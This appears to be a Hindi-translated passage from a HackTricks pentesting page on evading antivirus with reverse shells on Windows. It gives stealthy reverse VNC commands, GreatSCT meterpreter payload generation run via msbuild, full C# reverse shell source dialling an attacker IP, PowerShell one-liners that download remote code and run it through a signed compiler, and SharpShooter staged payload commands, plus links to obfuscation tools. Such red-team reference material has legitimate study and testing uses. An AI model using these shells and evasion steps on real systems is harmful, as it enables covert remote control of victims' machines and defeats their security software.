**हमलावर** को अपने **होस्ट** के अंदर बाइनरी `vncviewer.exe -listen 5900` को चलाना चाहिए ताकि वह एक रिवर्स **VNC कनेक्शन** को पकड़ने के लिए **तैयार** हो जाए। फिर, **विक्टिम** के अंदर: winvnc डेमन चलाएं `winvnc.exe -run` और `winwnc.exe [-autoreconnect] -connect <हमलावर_ip>::5900`

**चेतावनी:** गुप्तचरता बनाए रखने के लिए आपको कुछ चीज़ें नहीं करनी चाहिए

* अगर यह पहले से चल रहा है, तो `winvnc` न चलाएं या आप एक [पॉपअप](https://i.imgur.com/1SROTTl.png) को ट्रिगर कर देंगे। `tasklist | findstr winvnc` के साथ चल रहा है या नहीं यह जांचें
* `UltraVNC.ini` के बिना `winvnc` न चलाएं या यह [कॉन्फ़िग विंडो](https://i.imgur.com/rfMQWcf.png) खोल देगा
* मदद के लिए `winvnc -h` न चलाएं या आप एक [पॉपअप](https://i.imgur.com/oc18wcu.png) को ट्रिगर कर देंगे

### GreatSCT

इसे यहाँ से डाउनलोड करें: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT के अंदर:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
अब **लिस्टनर को शुरू** करें `msfconsole -r file.rc` और **एक्सीक्यूट** करें **एक्सएमएल पेलोड** के साथ:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**वर्तमान रक्षक प्रक्रिया को बहुत तेजी से समाप्त कर देगा।**

### हमारी खुद की रिवर्स शैल को कंपाइल करना

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### पहला सी# रिवर्सशैल

इसे इस प्रकार कंपाइल करें:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Use it with:  
इसका उपयोग करें:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# का उपयोग करके कंपाइलर
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

स्वचालित डाउनलोड और क्रियान्वयन:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

C# obfuscators list: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

### सी++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### पायथन का उपयोग इंजेक्टर उदाहरण के लिए:

* [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### अन्य उपकरण
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### अधिक

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) का खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* **शामिल हों** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें, HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके।

</details>
